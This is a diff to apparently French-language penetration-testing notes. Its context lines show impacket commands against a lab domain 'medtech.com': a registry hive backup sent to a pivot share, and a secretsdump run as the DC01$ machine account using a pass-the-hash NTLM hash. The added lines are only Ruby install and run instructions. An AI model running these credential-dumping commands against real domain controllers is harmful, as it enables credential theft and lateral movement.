@@ -81,3 +81,19 @@ impacket-reg medtech.com/joe:'Flowers1'@172.16.190.10 backup -o '\\<IP_PIVOT>\so
 ```bash
 impacket-secretsdump medtech.com/'DC01$'@172.16.190.10 -hashes aad3b435b51404eeaad3b435b51404ee:2e283e8ba256451651cacb72e8fac449
 ```
+
+## Ruby
+
+```bash
+sudo apt install ruby
+ruby -v
+ruby script.rb arg1 arg2
+```
+
+**Avec des dépendances (gems)**
+```bash
+gem install nom_gem
+# ou si le projet a un Gemfile :
+bundle install
+bundle exec ruby script.rb
+```
